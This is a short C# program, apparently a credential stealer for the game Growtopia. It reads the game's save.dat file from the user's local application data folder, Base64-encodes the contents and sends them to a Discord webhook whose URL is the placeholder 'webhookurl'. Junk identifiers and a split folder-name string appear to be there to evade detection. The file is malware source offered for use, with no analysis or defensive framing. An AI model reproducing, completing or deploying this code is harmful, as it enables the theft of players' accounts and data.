using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace testingforbluqder
{
    class Program
    {
        public class wdasdwadsadwasd : IDisposable
        {
            private readonly WebClient wdadwdasdwadwa;
            private static NameValueCollection discordValues = new NameValueCollection();
            public string WebHook { get; set; }
            public string UserName { get; set; }
            public string ProfilePicture { get; set; }

            public wdasdwadsadwasd()
            {
                wdadwdasdwadwa = new WebClient();
            }


            public void SendMessage(string msgSend)
            {
                discordValues.Add("content", msgSend);

                wdadwdasdwadwa.UploadValues(WebHook, discordValues);
            }

            public void Dispose()
            {
                wdadwdasdwadwa.Dispose();
            }
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }
            static void Main(string[] args)
            {
                 string d = "";
                 int dd = 24325;
                 double pi = 3.145926;
                 Thread.Sleep(600);
                 string gtpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)+@"\Growt"+d+@"opia\save.dat";
                 Console.WriteLine(File.ReadAllText(gtpath));
                 Console.ReadLine();
                 using (wdasdwadsadwasd dwadsadwa = new wdasdwadsadwasd())
                 {
                     dwadsadwa.WebHook = "webhookurl";
                     dwadsadwa.SendMessage(Base64Encode(File.ReadAllText(gtpath)));
                 }
            }
        }
    }
